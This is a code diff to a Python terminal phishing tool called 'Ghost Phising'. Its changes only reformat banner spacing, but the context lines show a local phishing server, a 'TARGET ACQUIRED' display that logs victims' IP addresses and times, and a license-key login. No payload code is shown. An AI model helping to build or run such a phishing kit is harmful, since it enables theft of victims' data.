@@ -54,7 +54,7 @@ def banner(role_name):
     r_col = R if role_name == "OWNER" else G
     clear()
     print(f"""
-{C}⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠔⠒⠊⠉⠉⠉⠉⠙⠒⠲⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀             {BG_RED}{W} 💥 GHOST PHISING 💥 {RESET}
+{C}⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠔⠒⠊⠉⠉⠉⠉⠙⠒⠲⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀            {BG_RED}{W} 💥 GHOST PHISING 💥 {RESET}
 {C}⠀⠀⠀⠀⠀⣠⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⠀⠀      {C}Localhost   {W}: {Y}http://127.0.0.1:8080
 {Y}⠀⠀⠀⣠⠞⠁⠀⣀⠀⠀⠀⠀⢀⣀⡀⠀⢀⣀⠀⠀⠀⠀⢀⠀⠈⠱⣄⠀⠀⠀      {G}Role        {W}: {r_col}{role_name}
 {Y}⠀⠀⡴⠁⡠⣴⠟⠁⢀⠤⠂⡠⠊⡰⠁⠇⢃⠁⠊⠑⠠⡀⠀⢹⣶⢤⡈⢣⡀⠀      {Y}Tools       {W}: {W}Ghost_Phsing
@@ -99,7 +99,7 @@ def log_data():
         sesi_id = f"GPS-GhoPhis{random.randint(1000, 9999)}"
 
         # HEADER BARU (KEMBALI KE GAYA TARGET ACQUIRED)
-        print(f"\n             {BG_BLUE}{W} ⚡ TARGET ACQUIRED ⚡ {RESET}")
+        print(f"\n        {BG_BLUE}{W} ⚡ TARGET ACQUIRED ⚡ {RESET}")
         print(f"{G}[+] BASIC INFO")
         print(f"{Y} • {W}🌐 IP Address   : {G}{ip}")
         print(f"{M} • {W}⏰ Local Time   : {Y}{t_target.strftime('%H:%M:%S')} {tz_label}")
@@ -150,7 +150,7 @@ def start_server(role):
 def login_system():
     while True:
         clear()
-        print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n       {W}SISTEM LISENSI GHOST-PHISING 🗝️ {R}[VIP]\n{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n {C}• {W}getkey    {Y}: Ambil ID Unit\n {C}• {W}verifkey  {Y}: Masuk ke Tools\n\n{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n       {W}SISTEM LISENSI GHOST-PHISING 🗝️ {R}[VIP]\n{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n {C}• {W}getkey    {Y}: Ambil ID Unit\n {C}• {W}verifkey  {Y}: Masuk ke Tools\n{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         cmd = input(f"{W}Ghost > {G}").strip().lower()
         if cmd == "getkey": 
             print(f"{Y}[!] ID Unit Lu: {W}{get_termux_id()}"); input("\nTekan Enter...")
